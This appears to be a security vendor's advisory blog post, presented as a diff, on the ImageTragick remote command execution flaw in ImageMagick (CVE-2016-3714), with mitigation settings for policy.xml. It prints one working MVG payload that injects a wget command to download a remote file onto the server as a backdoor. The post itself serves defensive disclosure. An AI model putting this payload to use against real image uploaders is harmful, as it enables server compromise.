@@ -1,0 +1,31 @@
+ImageMagick Remote Command Execution Vulnerability
+
+ImageMagick is a popular software used to convert, edit and manipulate images. It has libraries for all common programming languages, including PHP, Python, Ruby and many others. It is also very simple to use, which lead it to be used by many developers when in need of image cropping or manipulation.
+However, the latest versions of ImageMagick doesn’t properly filter the file names that get passed to the internal delegates that handle external protocols (like HTTPS). This allows an attacker to execute his own commands remotely by uploading an image. This leads to a full RCE (remote command execution) vulnerability in your image uploader. The vulnerability is so serious that researchers created a fun nick name for it which is easier to remember than just CVE-2016-3714: ImageTragick.
+
+Vulnerability Details
+Since the initial partial disclosure of this vulnerability our research team has been 100% focused on trying to create a workable proof of concept to understand the exploit and test our own protections against it. After many hours and some great help from the security community, we were able understand the vulnerability enough to create a simple PHP upload tool that uses ImageMagick, and the exploit to compromise it (hat tip to Cosmin, one our developers that help the research team there).
+The vulnerability is very simple to exploit, an attacker only needs a image uploader tool that leverages ImageMagick. During our research we found many popular web applications and SaaS products vulnerable to it (people love gravatars), and we have been contacting them privately to get things patched. Unfortunately, even with all the media attention, not everyone is aware of this issue.
+Going into a bit more details, this vulnerability can actually be divided in 4 different issues (or maybe 5, depending on who you ask), that is very well explained by Karim Valiev from the Mail.Ru Security Team here. So summarize, this is what we have to be aware:
+
+Remote command execution on .mvg/.svg file uploads. By proving a malicious file, an attacker can force a shell command to be executed on the server. This is a very simple example being shared lately:
+image Over 0,0 1,1 'url(https:";wget "http://pastebin.com/raw/badpastebin" -O /home/vhosts/file/backdoor.pl")'
+When that gets added to a MVG file, the wget command is executed and the output of the pastebin file saved on backdoor.pl.
+Remote file deletion. When using the “ephemeral:/” protocol, an attacker can remove files on the server
+Remote file moving: Similar to the file deletion issue, but when using the “msl:/” pseudo protocol, the attacker can move files around
+File content disclosure when using the “label:@” protocol.
+
+When combining all these issues, the attackers have a wide range of options and tools to compromise a web application that leverages ImageMagick. Note that only filtering for MGV extension is not enough, as any file format will be inspected and the command executed.
+I suspect a lot more vulnerabilities within ImageMagick will be found soon as more researchers are looking at it.
+Also note that the latest signatures set for ModSecurity and others IDS tools do not detect or block this issue. We updated our WAF last night to virtually patch this vulnerability, users behind the Sucuri Firewall are now protected. We also went back looking for previous attacks and we didn’t see any in the wild, yet. That will likely change soon as attackers build their own exploits.
+Protection
+Users behind our WAF are already protected against this vulnerability, but we still recommend everyone to follow the ImageMagick developers recommendation and edit the /etc/ImageMagick/policy.xml file and disable the processing of MVG, HTTPS, EPHEMERAL, and MSL commands within image files. In the section, add the following lines:
+<policymap>
+...
+<policy domain="coder" rights="none" pattern="EPHEMERAL" />
+<policy domain="coder" rights="none" pattern="HTTPS" />
+<policy domain="coder" rights="none" pattern="URL" />
+<policy domain="coder" rights="none" pattern="MVG" />
+<policy domain="coder" rights="none" pattern="MSL" />
+</policymap>"
+If you can not make those changes, I recommend disabling the image upload functionality for now until you can properly patch. Better safe than sorry.
